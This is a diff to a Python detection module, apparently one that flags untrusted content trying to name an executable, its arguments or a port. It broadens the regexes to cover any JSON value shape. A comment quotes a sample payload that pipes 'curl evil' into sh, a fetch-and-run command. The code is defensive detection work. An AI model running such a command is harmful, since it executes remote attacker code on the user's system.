@@ -63,8 +63,27 @@ SOURCE_TRUST = {
 EXEC_KEYS = "runtimeExecutable|command|cmd|exec|entrypoint|program|shell|interpreter"
 ARGS_KEYS = "runtimeArgs|args|argv"
 
-# `"runtimeExecutable": "npm"` — a JSON key whose value is an executable.
-EXEC_KEY_JSON = r'"(?:' + EXEC_KEYS + r')"\s*:\s*"[^"]{1,200}"'
+# A JSON value, in any of the shapes JSON actually allows.
+#
+# Issue #7: the first version hard-coded ONE shape per key — a quoted string
+# for executables, a bare number for ports — so each pattern was blind to the
+# other's form. `{"port": "3000"}` scored 0.0, and
+# `{"command": ["sh", "-c", "curl evil | sh"]}` scored 0.264 and proceeded.
+# Arrays are the canonical form for exactly these keys (docker-compose,
+# Kubernetes, launch.json), so the most idiomatic payload was the missed one.
+#
+# Match the KEY, then take whatever follows. The key is the security-relevant
+# part: something that is not the principal is naming the thing that runs.
+JSON_ANY_VALUE = (
+    r'(?:"[^"]{0,200}"'       # string
+    r'|\[[^\]]{0,400}\]'       # array
+    r'|\d{1,10}'              # number
+    r'|true|false|null'       # literal
+    r'|\{)'                   # nested object — flag the key, do not parse JSON with a regex
+)
+
+# `"runtimeExecutable": "npm"`, `"command": ["sh", "-c", ...]`, `"exec": {...}`.
+EXEC_KEY_JSON = r'"(?:' + EXEC_KEYS + r')"\s*:\s*' + JSON_ANY_VALUE
 # `"runtimeArgs": ["run", "dev"]` — the argument vector that goes with it.
 ARGS_KEY_JSON = r'"(?:' + ARGS_KEYS + r')"\s*:\s*\['
 
@@ -103,7 +122,7 @@ GOVERNING_PARAM_PATTERNS = [
     # the plainest sense of the term, and is now counted as one.
     re.compile(EXEC_KEY_JSON),
     re.compile(ARGS_KEY_JSON),
-    re.compile(r'"(?:port|PORT)"\s*:\s*\d{2,5}'),
+    re.compile(r'"(?:port|PORT)"\s*:\s*"?\d{2,5}"?'),
 ]
 
 # Signals that lower the verification threshold by manufacturing urgency.
